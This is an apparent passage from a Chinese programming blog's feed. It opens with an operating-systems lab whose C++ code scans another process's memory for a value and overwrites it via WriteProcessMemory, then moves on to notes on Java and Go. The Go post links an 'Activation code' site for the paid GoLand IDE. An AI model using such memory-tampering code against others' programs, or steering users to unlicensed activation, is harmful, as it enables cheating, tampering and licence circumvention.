		dwCurPos = (DWORD) MemBaseInfo.BaseAddress + MemBaseInfo.RegionSize ;
	}
	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it = MemList.begin();
	int num=0;
	dwCurPos = (DWORD)(*it).BaseAddress;
	for( ;it != MemList.end(); it++){
		cout&lt;&lt;dec&lt;&lt;&quot;---- &quot;&lt;&lt;++num&lt;&lt;&quot; ----&quot;&lt;&lt;endl;
		cout&lt;&lt;&quot;内存块基址: 0x&quot;&lt;&lt;hex&lt;&lt;dwCurPos&lt;&lt;endl;
		cout&lt;&lt;&quot;保护方式：&quot;&lt;&lt;(*it).AllocationProtect&lt;&lt;endl;
		cout&lt;&lt;&quot;区域大小：&quot;&lt;&lt;(*it).RegionSize&lt;&lt;endl;
		cout&lt;&lt;&quot;状态：&quot;;
		if((*it).State == MEM_COMMIT){
			cout&lt;&lt;&quot;提交&quot;&lt;&lt;endl;
		}else if((*it).State == MEM_FREE){
			cout&lt;&lt;&quot;空闲&quot;&lt;&lt;endl;
		}else if((*it).State == MEM_RESERVE){
			cout&lt;&lt;&quot;保留&quot;&lt;&lt;endl;
		}else{}
		cout&lt;&lt;&quot;访问保护方式：&quot;;
		if((*it).Protect == PAGE_READONLY){
			cout&lt;&lt;&quot;只读&quot;&lt;&lt;endl;
		}else if((*it).Protect == PAGE_READWRITE ){
			cout&lt;&lt;&quot;读/写&quot;&lt;&lt;endl;
		}else if((*it).Protect == PAGE_EXECUTE){
			cout&lt;&lt;&quot;可执行&quot;&lt;&lt;endl;
		}else if((*it).Protect == PAGE_EXECUTE_READ){
			cout&lt;&lt;&quot;可执行/读&quot;&lt;&lt;endl;
		}else if((*it).Protect == PAGE_EXECUTE_READWRITE){
			cout&lt;&lt;&quot;可执行/读写&quot;&lt;&lt;endl;
		}else if((*it).Protect == PAGE_NOACCESS){
			cout&lt;&lt;&quot;不允许存储&quot;&lt;&lt;endl;
		}
		cout&lt;&lt;&quot;类型：&quot;;
		if((*it).Type == MEM_IMAGE){
			cout&lt;&lt;&quot;映像&quot;&lt;&lt;endl;
		}else if((*it).Type == MEM_MAPPED){
			cout&lt;&lt;&quot;映射&quot;&lt;&lt;endl;
		}else if((*it).Type == MEM_PRIVATE){
			cout&lt;&lt;&quot;私有&quot;&lt;&lt;endl;
		}else{}
		dwCurPos+=(*it).RegionSize ;
	}
	return true;
}


bool SearchProcessMemory(DWORD dwProcessId,DWORD dwValue){
	AddrList.clear();
	if(MemList.empty()){
		return false;
	}
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	if(dwProcessId !=GetCurrentProcessId()){
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,dwProcessId);
		if(hProcess ==NULL)
			return false;
	}
	LPBYTE lpBuff = new BYTE[systemInfo.dwPageSize];
	list&lt;MEMORY_BASIC_INFORMATION&gt;::iterator it;
	for(it=MemList.begin();it!=MemList.end();it++){
		if(it-&gt;State != MEM_COMMIT){
			continue;
		}
		DWORD dwSize =0;
		SIZE_T dwReadBytes=0;
		while(dwSize &lt; it-&gt;RegionSize){
			LPVOID lpAddr = (LPVOID)((DWORD)it-&gt;BaseAddress+dwSize);
			if(ReadProcessMemory(hProcess,lpAddr,lpBuff,systemInfo.dwPageSize,&amp;dwReadBytes)==FALSE){
				dwSize +=systemInfo.dwPageSize;
				continue;
			}
			for(int i=0;i&lt;dwReadBytes -3;i++){
				if(*((DWORD *)(lpBuff+i)) ==dwValue){
					AddrList.push_back((DWORD)lpAddr+i);
				}
				if(AddrList.size()==MAX_ADDR_NUM){
					delete []lpBuff;
					CloseHandle(hProcess);
					return true;
				}
			}
			dwSize+=systemInfo.dwPageSize;
		}
	}
	delete []lpBuff;
	CloseHandle(hProcess);
	return true;
}


bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,DWORD dwValue){
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	if(dwProcessId !=GetCurrentProcessId()){
		hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
		if(hProcess ==NULL)
			return false;
	}
	SIZE_T dwWriteBytes =0;
	DWORD dwOldProtect;
	if(!VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),PAGE_EXECUTE_READWRITE,&amp;dwOldProtect)){
		cout&lt;&lt;&quot;protect!&quot;&lt;&lt;endl;
		DWORD dwReturn = GetLastError();
		cout&lt;&lt;dwReturn&lt;&lt;endl;
	}
	if(!WriteProcessMemory(hProcess,(LPVOID)dwTagAddr,&amp;dwValue,sizeof(DWORD),&amp;dwWriteBytes)){
		cout&lt;&lt;&quot;write failed&quot;&lt;&lt;endl;
		DWORD dwReturn = GetLastError();
		cout&lt;&lt;dwReturn&lt;&lt;endl;
		return false;
	}
	VirtualProtectEx(hProcess,(LPVOID)dwTagAddr,sizeof(DWORD),dwOldProtect,NULL);
	CloseHandle(hProcess);
		return true;
}
</code></pre>
]]></content>
      <categories>
        <category>专业课</category>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-GUI编程</title>
    <url>/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
<p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
<strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
<p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
<p><strong>JTextField</strong> –一个轻量级组件，它允许编辑单行文本。</p>
<p><strong>JPasswordField</strong> – 允许我们输入一行字，像输入框，但隐藏输入字符为星号(*)。</p>
<p><strong>JButton</strong> – JButton 类的实例。用于创建按钮类似实例中的 “Login”。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>GUI</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 异常及处理</title>
    <url>/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
<p>不处理异常，将异常抛出给调用者。</p>
<p><code>throw</code>  、<code>throws</code></p>
<p>（挖坑待填）</p>
<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
<p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
<ol>
<li>可能出现异常的代码用<code>try</code>块括起来</li>
<li>用<code>catch</code>块来捕获异常并处理异常</li>
<li>一些不论是否出现异常都需要执行的代码，用<code>finally</code>块括起来，使其一定会被执行</li>
</ol>
<p><strong>代码执行过程的三种情况</strong></p>
<ol>
<li>
<p>try代码块中无异常，try代码执行完成，则不进入不执行catch(跳过)，执行finally块，及异常块后的其他代码other code；</p>
</li>
<li>
<p>try代码块中发生异常，try代码执行到有异常处即之后中断，产生异常对象(跟踪堆栈,执行流程)，进入catch块(异常类型匹配后处理)，后执行finally块，及异常块后的其他代码other code；</p>
</li>
<li>
<p>try代码块中发生异常，产生异常对象，异常类型不匹配，或者不捕获，程序中断运行(不用try和catch块进行处理，代码在异常出停止)；</p>
</li>
</ol>
<blockquote>
<p>finally块语句唯一不执行的情况：异常处理代码catch中执行System.exit(1)退出Java虚拟机 ；</p>
<p>一段代码可能会发生多种类型的异常，当发生异常，会按顺序查看每个catch语句，并执行第一个与异常类型匹配的catch块，执行后，其他的catch语句将忽略，执行继续执行finally块，及异常块后的其他代码other code。</p>
</blockquote>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 抽象类和接口</title>
    <url>/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/</url>
    <content><![CDATA[<h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
<p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
<p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
<p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
<p>抽象方法没有方法体。</p>
<p>关键字：<code>abstract</code></p>
<pre><code>public abstract Class1{
	public abstract void fun();
}
</code></pre>
<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
<p>接口和抽象类有点像，它是抽象方法的集合；</p>
<p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
<p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
<p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
<p>关键字：<code>interface</code></p>
<pre><code>[访问控制关键字] interface 接口名称 [extends 其他的接口名] {
        // 声明变量
        // 抽象方法
}
</code></pre>
<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
<p>关键字：<code>implements</code></p>
<pre><code>public class A implements 接口名称 [,接口名称,...]{
		//实现接口中的方法
}
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java网络编程</title>
    <url>/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
<p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
<pre><code class="language-java"> InetAddress类：

 public static InetAddress getByName(String host) //根据域名获取ip
     
 public static InetAddress getLocalHost() //获取本地ip
     
 public String getHostAddress() //获得InetAddress对象的ip地址
     
 public String getHostName() //获得InetAddress对象的域名
</code></pre>
<pre><code class="language-java"> Socket类：

 public Socket(InetAddress address, int port)
     
 public Socket(String host, int port)
     
 public Socket accept() //服务器端接收socket连接请求，创建socket对象
 
 public InputStream getInputStream() //返回此套接字的输入流，用于接收网络消息

 public OutputStream getOutputStream() //返回此套接字的输出流，用于发送网络消息
 
 public InetAddress getInetAddress() //返回此套接字连接到的远程IP地址或null
     
 public InetAddress getLocalAddress() //获取套接字绑定的本地地址
     
 public int getPort() //返回此套接字连接到的远程端口号或0
     
 public int getLocalPort() //返回此套接字绑定到的本地端口或 -1
     
 public void close()
</code></pre>
<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>golang的安装配置</title>
    <url>/2021/07/14/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h2 id="下载安装"><a class="header-anchor" href="#下载安装"></a>下载安装</h2>
<p>下载地址：<a href="https://golang.google.cn/">https://golang.google.cn/</a></p>
<p>安装后会自动添加环境变量</p>
<p>运行安装程序完成后查看go版本，验证是否已正确安装</p>
<pre><code class="language-shell">go version    #查看版本
</code></pre>
<h2 id="配置"><a class="header-anchor" href="#配置"></a>配置</h2>
<h3 id="env配置"><a class="header-anchor" href="#env配置"></a>env配置</h3>
<pre><code class="language-shell">go env    #查看go环境变量
go env -w [环境变量名]=[变量值]    #写入环境变量（go version &gt; 1.13）
</code></pre>
<p><img src="/2021/07/14/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/image-20210709091726706.png" alt="image-20210709091726706"></p>
<p>主要需要配置GOPATH（项目工作目录）、GOPROXY（go获取依赖包的代理服务器，proxy可以设置多个，⽤逗号<code>,</code>分隔，其中<code>direct</code>为直连）、GOPRIVATE（go get通过代理服务拉取私有仓库时，匹配那些不⾛代理的私有仓库）</p>
<pre><code>GOPROXY=&quot;https://goproxy.cn,https://goproxy.io,direct&quot;
GOPRIVATE=&quot;*.gitlab.com,*.gitee.com&quot;
</code></pre>
<h3 id="IDE配置"><a class="header-anchor" href="#IDE配置"></a>IDE配置</h3>
<h4 id="goland"><a class="header-anchor" href="#goland"></a>goland</h4>
<p>goland:<a href="https://www.jetbrains.com/go/">https://www.jetbrains.com/go/</a></p>
<p>Activation code:<a href="http://vrg123.com/">http://vrg123.com/</a></p>
<h4 id="VSCode"><a class="header-anchor" href="#VSCode"></a>VSCode</h4>
<p>配置步骤：<a href="https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true">https://m.imooc.com/wiki/golesson-vscodeinstall?ishidefooter=true</a></p>
<p>更多配置：<a href="http://c.biancheng.net/view/6170.html">http://c.biancheng.net/view/6170.html</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>go</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>golang语言基础</title>
    <url>/2021/07/15/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="变量"><a class="header-anchor" href="#变量"></a>变量</h2>
<h3 id="定义变量"><a class="header-anchor" href="#定义变量"></a>定义变量</h3>
<pre><code class="language-go">//定义一个名称为“variableName”，类型为&quot;type&quot;的变量
var variableName type

//定义三个类型都是“type”的变量
var vname1, vname2, vname3 type

//初始化“variableName”的变量为“value”值，类型是“type”
var variableName type = value

/*
    定义三个类型都是&quot;type&quot;的变量,并且分别初始化为相应的值
    vname1为v1，vname2为v2，vname3为v3
*/
var vname1, vname2, vname3 type = v1, v2, v3

/*
    定义三个变量，它们分别初始化为相应的值
    vname1为v1，vname2为v2，vname3为v3
    然后Go会根据其相应值的类型来帮你初始化它们
*/
var vname1, vname2, vname3 = v1, v2, v3

/*
    :=这个符号直接取代了var和type,这种形式叫做简短声明。不过它有一个限制，那就是它只能用     在函数内部；在函数外部使用则会无法编译通过，所以一般用var方式来定义全局变量
*/
vname1, vname2, vname3 := v1, v2, v3

/*
	_（下划线）是个特殊的变量名，任何赋予它的值都会被丢弃。在这个例子中，我们将值35赋予     b，并同时丢弃34：
*/
_, b := 34, 35

</code></pre>
<p>Go对于已声明但未使用的变量会在编译阶段报错</p>
<h3 id="变量类型"><a class="header-anchor" href="#变量类型"></a>变量类型</h3>
<h4 id="Boolean"><a class="header-anchor" href="#Boolean"></a>Boolean</h4>
<p>在Go中，布尔值的类型为<code>bool</code>，值是<code>true</code>或<code>false</code>，默认为<code>false</code></p>
<pre><code class="language-go">//示例代码
var isActive bool  // 全局变量声明
var enabled, disabled = true, false  // 忽略类型的声明
func test() {
    var available bool  // 一般声明
    valid := false      // 简短声明
    available = true    // 赋值操作
}
</code></pre>
<h4 id="数值型"><a class="header-anchor" href="#数值型"></a>数值型</h4>
<p>整数类型有无符号和带符号两种。Go同时支持<code>int</code>和<code>uint</code>，这两种类型的长度相同，但具体长度取决于不同编译器的实现。Go里面也有直接定义好位数的类型：<code>rune</code>, <code>int8</code>, <code>int16</code>, <code>int32</code>, <code>int64</code>和<code>byte</code>, <code>uint8</code>, <code>uint16</code>, <code>uint32</code>, <code>uint64</code>。其中<code>rune</code>是<code>int32</code>的别称，<code>byte</code>是<code>uint8</code>的别称。</p>
<blockquote>
<p>需要注意的一点是，这些类型的变量之间不允许互相赋值或操作，不然会在编译时引起编译器报错</p>
<p>另外，尽管int的长度是32 bit, 但int 与 int32并不可以互用。</p>
</blockquote>
<p>浮点数的类型有<code>float32</code>和<code>float64</code>两种（没有<code>float</code>类型），默认是<code>float64</code></p>
<h4 id="字符串"><a class="header-anchor" href="#字符串"></a>字符串</h4>
<p>Go中的字符串都是采用<code>UTF-8</code>字符集编码。字符串是用一对双引号（&quot;&quot;）或反引号（``）括起来定义，它的类型是<code>string</code></p>
<p>在Go中字符串是不可变的，例如下面的代码编译时会报错：cannot assign to s[0]</p>
<pre><code class="language-go">var s string = &quot;hello&quot;
s[0] = 'c'
</code></pre>
<p>如果真的想要修改怎么办呢？下面的代码可以实现</p>
<pre><code class="language-go">s := &quot;hello&quot;
c := []byte(s)  // 将字符串 s 转换为 []byte 类型
c[0] = 'c'
s2 := string(c)  // 再转换回 string 类型
fmt.Printf(&quot;%s\n&quot;, s2)
</code></pre>
<p>Go中可以使用<code>+</code>操作符来连接两个字符串</p>
<p>修改字符串也可写为：</p>
<pre><code class="language-go">s := &quot;hello&quot;
s = &quot;c&quot; + s[1:] // 字符串虽不能更改，但可进行切片操作
fmt.Printf(&quot;%s\n&quot;, s)
</code></pre>
<p>如果要声明一个多行的字符串怎么办？可以通过反引号（``）来声明：</p>
<pre><code class="language-go">m := `hello
    world`
</code></pre>
<p>(``) 括起的字符串为Raw字符串，即字符串在代码中的形式就是打印时的形式，它没有字符转义，换行也将原样输出。例如本例中会输出：</p>
<pre><code>hello
    world
</code></pre>
<h4 id="错误类型"><a class="header-anchor" href="#错误类型"></a>错误类型</h4>
<p>Go内置有一个<code>error</code>类型，专门用来处理错误信息，Go的<code>package</code>里面还专门有一个包<code>errors</code>来处理错误</p>
<pre><code class="language-go">err := errors.New(&quot;emit macho dwarf: elf header corrupted&quot;)
if err != nil {  //nil 是 map、slice、pointer、channel、func、interface 的零值
    fmt.Print(err)
}
</code></pre>
<h4 id="类型转换"><a class="header-anchor" href="#类型转换"></a>类型转换</h4>
<pre><code class="language-go">// type_name(expression) 将 expression 转化为 type_name 类型
var sum int = 17
var count int =5
var mean float32
mean = float32(sum)/float32(count)
fmt.Printf(&quot;mean 的值为：%f\n&quot;,mean)
</code></pre>
<h3 id="常量"><a class="header-anchor" href="#常量"></a>常量</h3>
<p>常量也就是在程序编译阶段就确定下来的值，而程序在运行时无法改变该值。在Go程序中，常量可定义为数值、布尔值或字符串等类型。</p>
<pre><code class="language-go">const constantName = value
//如果需要，也可以明确指定常量的类型：
const Pi float32 = 3.1415926
</code></pre>
<h3 id="分组声明"><a class="header-anchor" href="#分组声明"></a>分组声明</h3>
<p>在Go语言中，同时声明多个常量、变量，或者导入多个包时，可采用分组的方式进行声明</p>
<p>例如下面的代码：</p>
<pre><code class="language-go">import &quot;fmt&quot;
import &quot;os&quot;

const i = 100
const pi = 3.1415
const prefix = &quot;Go_&quot;

var i int
var pi float32
var prefix string
</code></pre>
<p>可以分组写成如下形式：</p>
<pre><code class="language-go">import(
    &quot;fmt&quot;
    &quot;os&quot;
)

const(
    i = 100
    pi = 3.1415
    prefix = &quot;Go_&quot;
)

var(
    i int
    pi float32
    prefix string
)
</code></pre>
<h2 id="运算符"><a class="header-anchor" href="#运算符"></a>运算符</h2>
<p>go的运算符和C相同</p>
<p>算术运算符</p>
<p>关系运算符</p>
<p>逻辑运算符</p>
<p>位运算符——<code>&amp;</code>（与）、<code>|</code>（或）、<code>^</code>（异或）</p>
<h2 id="array、slice、map"><a class="header-anchor" href="#array、slice、map"></a>array、slice、map</h2>
<h3 id="array"><a class="header-anchor" href="#array"></a>array</h3>
<p><code>array</code>就是数组，它的定义方式如下：</p>
<pre><code class="language-go">var arr [n]type
</code></pre>
<p>在<code>[n]type</code>中，<code>n</code>表示数组的长度，<code>type</code>表示存储元素的类型。对数组的操作和其它语言类似，都是通过<code>[]</code>来进行读取或赋值：</p>
<pre><code class="language-go">var arr [10]int  // 声明了一个int类型的数组
arr[0] = 42      // 数组下标是从0开始的
arr[1] = 13      // 赋值操作
fmt.Printf(&quot;The first element is %d\n&quot;, arr[0])  // 获取数据，返回42
fmt.Printf(&quot;The last element is %d\n&quot;, arr[9]) //返回未赋值的最后一个元素，默认返回0
</code></pre>
<p>由于长度也是数组类型的一部分，因此<code>[3]int</code>与<code>[4]int</code>是不同的类型，数组也就不能改变长度。数组之间的赋值是值的赋值，即当把一个数组作为参数传入函数的时候，传入的其实是该数组的副本，而不是它的指针。如果要使用指针，那么就需要用到后面介绍的<code>slice</code>类型了。</p>
<p>数组同样可以使用<code>:=</code>进行简短声明</p>
<pre><code class="language-go">a := [3]int{1, 2, 3} // 声明了一个长度为3的int数组

b := [10]int{1, 2, 3} // 声明了一个长度为10的int数组，其中前三个元素初始化为1、2、3，其它默认为0

c := [...]int{4, 5, 6} // 可以省略长度而采用`...`的方式，Go会自动根据元素个数来计算长度
</code></pre>
<pre><code class="language-go">// 声明了一个二维数组，该数组以两个数组作为元素，其中每个数组中又有4个int类型的元素
doubleArray := [2][4]int{[4]int{1, 2, 3, 4}, [4]int{5, 6, 7, 8}}

// 上面的声明可以简化，直接忽略内部的类型
easyArray := [2][4]int{{1, 2, 3, 4}, {5, 6, 7, 8}}
</code></pre>
<p><img src="/2021/07/15/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/2.2.array.png" alt="img"></p>
<h3 id="slice"><a class="header-anchor" href="#slice"></a>slice</h3>
<p>在很多应用场景中，数组并不能满足我们的需求。在初始定义数组时，我们并不知道需要多大的数组，因此我们就需要“动态数组”。在Go里面这种数据结构叫<code>slice</code></p>
<p><code>slice</code>并不是真正意义上的动态数组，而是一个引用类型。<code>slice</code>总是指向一个底层<code>array</code>，<code>slice</code>的声明也可以像<code>array</code>一样，只是不需要长度。</p>
<pre><code class="language-go">// 和声明array一样，只是少了长度
var fslice []int
</code></pre>
<p><code>slice</code>可以从一个数组或一个已经存在的<code>slice</code>中再次声明。<code>slice</code>通过<code>array[i:j]</code>来获取，其中<code>i</code>是数组的开始位置，<code>j</code>是结束位置，但不包含<code>array[j]</code>，它的长度是<code>j-i</code>。</p>
<pre><code class="language-go">// 声明一个含有10个元素元素类型为byte的数组
var ar = [10]byte {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j'}

// 声明两个含有byte的slice
var a, b []byte

// a指向数组的第3个元素开始，并到第五个元素结束，
a = ar[2:5]
//现在a含有的元素: ar[2]、ar[3]和ar[4]

// b是数组ar的另一个slice
b = ar[3:5]
// b的元素是：ar[3]和ar[4]
</code></pre>
<p><img src="/2021/07/15/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/Go%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/2.2.slice.png" alt="img"></p>
<blockquote>
<p>注意<code>slice</code>和数组在声明时的区别：声明数组时，方括号内写明了数组的长度或使用<code>...</code>自动计算长度，而声明<code>slice</code>时，方括号内没有任何字符。</p>
</blockquote>
<p><code>slice</code>是引用类型，所以当引用改变其中元素的值时，其它的所有引用都会改变该值，例如上面的<code>aSlice</code>和<code>bSlice</code>，如果修改了<code>bSlice</code>中元素的值，那么<code>aSlice</code>相对应的值也会改变。</p>
<p>对于<code>slice</code>有几个有用的内置函数：</p>
<ul>
<li><code>len</code> 获取<code>slice</code>的长度</li>
<li><code>cap</code> 获取<code>slice</code>的最大容量</li>
<li><code>append</code> 向<code>slice</code>里面追加一个或者多个元素，然后返回一个和<code>slice</code>一样类型的<code>slice</code></li>
<li><code>copy</code> 函数<code>copy</code>从源<code>slice</code>的<code>src</code>中复制元素到目标<code>dst</code>，并且返回复制的元素的个数</li>
</ul>
<pre><code class="language-go">leng := len(slice_a)
slice_b := append(slice_a, 'l')
</code></pre>
<p>注：<code>append</code>函数会改变<code>slice</code>所引用的数组的内容，从而影响到引用同一数组的其它<code>slice</code>。 但当<code>slice</code>中没有剩余空间（即<code>(cap-len) == 0</code>）时，此时将动态分配新的数组空间。返回的<code>slice</code>数组指针将指向这个空间，而原数组的内容将保持不变；其它引用此数组的<code>slice</code>则不受影响。</p>
<h3 id="map"><a class="header-anchor" href="#map"></a>map</h3>
<p><code>map</code>也就是Python中字典的概念，它的格式为<code>map[keyType]valueType</code></p>
<p>我们看下面的代码，<code>map</code>的读取和设置也类似<code>slice</code>一样，通过<code>key</code>来操作，只是<code>slice</code>的<code>index</code>只能是<code>int</code>类型，而<code>map</code>多了很多类型，可以是<code>int</code>，可以是<code>string</code>及所有完全定义了<code>==</code>与<code>!=</code>操作的类型。</p>
<pre><code class="language-go">// 声明一个key是字符串，值为int的字典,这种方式的声明需要在使用之前使用make初始化
var numbers map[string]int
numbers = make(map[string]int)

// 另一种map的声明方式
numbers := make(map[string]int)
numbers[&quot;one&quot;] = 1  //赋值
numbers[&quot;ten&quot;] = 10 //赋值
numbers[&quot;three&quot;] = 3

fmt.Println(&quot;第三个数字是: &quot;, numbers[&quot;three&quot;]) // 读取数据
// 打印出来如:第三个数字是: 3
</code></pre>
<p>这个<code>map</code>就像我们平常看到的表格一样，左边列是<code>key</code>，右边列是值</p>
<p>使用map过程中需要注意的几点：</p>
<ul>
<li><code>map</code>是无序的，每次打印出来的<code>map</code>都会不一样，它不能通过<code>index</code>获取，而必须通过<code>key</code>获取</li>
<li><code>map</code>的长度是不固定的，也就是和<code>slice</code>一样，也是一种引用类型</li>
<li>内置的<code>len</code>函数同样适用于<code>map</code>，返回<code>map</code>拥有的<code>key</code>的数量</li>
<li><code>map</code>的值可以很方便的修改，通过<code>numbers[&quot;one&quot;]=11</code>可以很容易的把key为<code>one</code>的字典值改为<code>11</code></li>
<li><code>map</code>和其他基本型别不同，它不是thread-safe，在多个go-routine存取时，必须使用mutex lock机制</li>
</ul>
<p><code>map</code>的初始化可以通过<code>key:val</code>的方式初始化值，同时<code>map</code>内置有判断是否存在<code>key</code>的方式</p>
<p>通过<code>delete</code>删除<code>map</code>的元素：</p>
<pre><code class="language-go">// 初始化一个字典
rating := map[string]float32{&quot;C&quot;:5, &quot;Go&quot;:4.5, &quot;Python&quot;:4.5, &quot;C++&quot;:2 }
// map有两个返回值，第二个返回值，如果不存在key，那么ok为false，如果存在ok为true
csharpRating, ok := rating[&quot;C#&quot;]
if ok {
    fmt.Println(&quot;C# is in the map and its rating is &quot;, csharpRating)
} else {
    fmt.Println(&quot;We have no rating associated with C# in the map&quot;)
}

delete(rating, &quot;C&quot;)  // 删除key为C的元素
</code></pre>
<p>上面说过了，<code>map</code>也是一种引用类型，如果两个<code>map</code>同时指向一个底层，那么一个改变，另一个也相应的改变：</p>
<pre><code class="language-go">m := make(map[string]string)
m[&quot;Hello&quot;] = &quot;Bonjour&quot;
m1 := m
m1[&quot;Hello&quot;] = &quot;Salut&quot;  // 现在m[&quot;hello&quot;]的值已经是Salut了
</code></pre>
<h3 id="遍历"><a class="header-anchor" href="#遍历"></a>遍历</h3>
<p>Go语言中<code>range</code>关键字用于 for 循环中迭代数组(array)、切片(slice)、通道(channel)或集合(map)的元素。返回索引值和索引对应位置的值</p>
<h2 id="分配存储空间"><a class="header-anchor" href="#分配存储空间"></a>分配存储空间</h2>
<p><code>make</code>用于内建类型（<code>map</code>、<code>slice</code> 和<code>channel</code>）的内存分配。<code>new</code>用于各种类型的内存分配。</p>
<h3 id="make"><a class="header-anchor" href="#make"></a>make</h3>
<pre><code class="language-go">func make(t Type, size ...IntegerType) Type
</code></pre>
<p><code>make</code>返回一个<code>Type</code>类型的值，返回值取决于<code>Type</code></p>
<pre><code class="language-go">//如下声明一个slice，得到一个length为0，cap为10的slice
slice1 := make([]int, 0, 10)
//此时需要我们自行使用 append 向 slice1 中添加数据
</code></pre>
<h3 id="new"><a class="header-anchor" href="#new"></a>new</h3>
<pre><code class="language-go">func new(Type) *Type
</code></pre>
<p><code>new</code>返回的是<code>*Type</code>类型指针，指针指向由零值填充的<code>Type</code>类型的内存空间</p>
<h3 id="零值"><a class="header-anchor" href="#零值"></a>零值</h3>
<p>“零值”所指并非空值，而是一种“变量未填充前”的默认值，通常为0。 此处罗列部分类型的“零值”</p>
<pre><code>int     0
int8    0
